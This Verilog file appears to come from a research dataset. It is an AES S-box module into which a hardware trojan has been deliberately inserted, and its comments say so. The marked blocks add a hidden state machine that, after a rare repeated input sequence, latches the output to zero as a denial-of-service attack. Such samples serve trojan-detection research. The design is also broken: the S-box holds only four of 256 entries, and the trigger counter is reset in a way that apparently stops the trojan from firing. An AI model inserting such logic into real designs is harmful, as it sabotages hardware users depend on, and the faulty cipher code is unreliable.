// TROJANED DESIGN - RESEARCH USE ONLY
// Generated by GHOST_Trojan_GPT on 2026-05-01 18:02:31
// Original: aes_sbox.v
// Vulnerability: T3
// Model: gpt-4.1
// Version: 1
// WARNING: This design contains intentionally inserted vulnerabilities for research purposes

module aes_sbox(
    input clk,                     // trojan_insertion_begin // Added clock
    input rst_n,                   // trojan_insertion_begin // Added active-low reset
    input [7:0] data_in,
    output reg [7:0] data_out
);
// trojan_insertion_begin //
    // Trojan state to track rare trigger sequence
    reg [2:0] trigger_state;   
    reg [7:0] trigger_counter; // Counter for sequence occurrence

    // Denial-of-Service enable
    reg dos_active;           

    // Trojan: Trigger is rare sequence of inputs [8'h03, 8'h01, 8'h02] in three consecutive cycles
    localparam IDLE    = 3'd0;
    localparam SEQ1    = 3'd1;
    localparam SEQ2    = 3'd2;
    localparam SEQ3    = 3'd3;
    localparam DOS_ON  = 3'd4;

    always @(posedge clk or negedge rst_n) begin
        if (~rst_n) begin
            trigger_state <= IDLE;
            trigger_counter <= 8'd0;
            dos_active <= 1'b0;
        end else begin
            case(trigger_state)
                IDLE: begin
                    if (data_in == 8'h03)
                        trigger_state <= SEQ1;
                    else
                        trigger_state <= IDLE;
                    trigger_counter <= 8'd0;
                    dos_active <= 1'b0;
                end
                SEQ1: begin
                    if (data_in == 8'h01)
                        trigger_state <= SEQ2;
                    else
                        trigger_state <= IDLE;
                end
                SEQ2: begin
                    if (data_in == 8'h02)
                        trigger_state <= SEQ3;
                    else
                        trigger_state <= IDLE;
                end
                SEQ3: begin
                    // Sequence detected: increment counter
                    trigger_counter <= trigger_counter + 1'b1;
                    if (trigger_counter == 8'd2) begin // On third such sequence, activate
                        dos_active <= 1'b1;
                        trigger_state <= DOS_ON;
                    end else begin
                        trigger_state <= IDLE;
                    end
                end
                DOS_ON: begin
                    dos_active <= 1'b1; // Latch DoS until reset
                    trigger_state <= DOS_ON;
                end
                default: begin
                    trigger_state <= IDLE;
                    dos_active <= 1'b0;
                end
            endcase
        end
    end
// trojan_insertion_end //

    always @(*) begin
// trojan_insertion_begin //
        if (dos_active) 
            data_out = 8'h00; // Deny service: always output zero
        else
// trojan_insertion_end //
        case(data_in)
            8'h00: data_out = 8'h63;
            8'h01: data_out = 8'h7C;
            8'h02: data_out = 8'h77;
            8'h03: data_out = 8'h7B;
            default: data_out = 8'h00;
        endcase
    end
endmodule